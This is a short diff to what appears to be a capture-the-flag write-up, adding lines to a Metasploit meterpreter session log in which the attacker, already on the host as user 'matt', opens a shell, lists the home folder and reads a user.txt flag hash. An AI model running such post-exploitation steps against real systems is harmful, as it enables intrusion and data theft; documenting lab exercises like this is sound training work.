@@ -102,7 +102,12 @@ LHOST => tun0
 
 meterpreter > getuid 
 Server username: matt
-meterpreter >
+meterpreter > shell
+cd /home/matt
+ls
+user.txt
+cat user.txt
+c06f3d03f86982c2cd7daa9fd244029f
 ````
 
 
